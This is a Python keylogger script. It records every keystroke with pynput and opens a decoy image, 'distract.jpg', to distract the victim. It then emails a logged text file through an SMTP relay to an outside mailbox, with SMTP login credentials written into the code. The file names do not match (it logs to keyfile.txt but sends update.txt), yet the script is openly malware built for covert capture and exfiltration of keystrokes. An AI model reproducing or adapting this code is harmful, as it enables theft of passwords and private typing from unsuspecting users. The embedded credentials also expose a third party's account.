import os
from pynput import keyboard
from datetime import datetime
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Brevo SMTP credentials
SMTP_SERVER = "smtp-relay.brevo.com"
SMTP_PORT = 587
EMAIL_ADDRESS = "9d7474001@smtp-brevo.com"  # Your Brevo username
EMAIL_PASSWORD = "xsmtpsib-6439b117eaf1b041d33334a56917f6f417709f0c7a52e4fd9ba523aff8a1a556-AcfjJmfAugEcyR0O"

# Email addresses
TO_EMAIL = "keyloggymckeyloggyface@outlook.com"  # Destination email
TXT_FILE = "update.txt"  # File to send

# Function to send contents of a text file
def send_file_contents():
    try:
        # Read file contents
        with open(TXT_FILE, "r") as f:
            contents = f.read().strip()

        if not contents:
            print("No new content to send.")
            return

        # Create email
        msg = MIMEText(contents, "plain")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = TO_EMAIL
        msg["Subject"] = "Automated TXT File Update"

        # Send email
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.set_debuglevel(1)  # Optional: show SMTP debug info
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)

        print("✓ Email sent successfully.")

        # Clear file after sending
        with open(TXT_FILE, "w") as f:
            f.write("")

    except smtplib.SMTPAuthenticationError:
        print("✗ Authentication failed. Check your login and SMTP key.")
    except FileNotFoundError:
        print(f"✗ File not found: {TXT_FILE}")
    except Exception as e:
        print(f"✗ Error occurred: {e}")

# Example usage
if __name__ == "__main__":
    send_file_contents()
    input("\nPress Enter to exit...")

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", "a") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            if key == keyboard.Key.space:
                logKey.write(' ')
            elif key == keyboard.Key.enter:
                logKey.write('\n')
            elif key == keyboard.Key.tab:
                logKey.write('\t')
            else:
                logKey.write(f'[{key.name}]')


if __name__ == "__main__":
    # Opens the image 
    os.startfile("distract.jpg")  

    # Start the keylogger
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
    # send txt file
    send_file_contents()
    time.sleep(1)
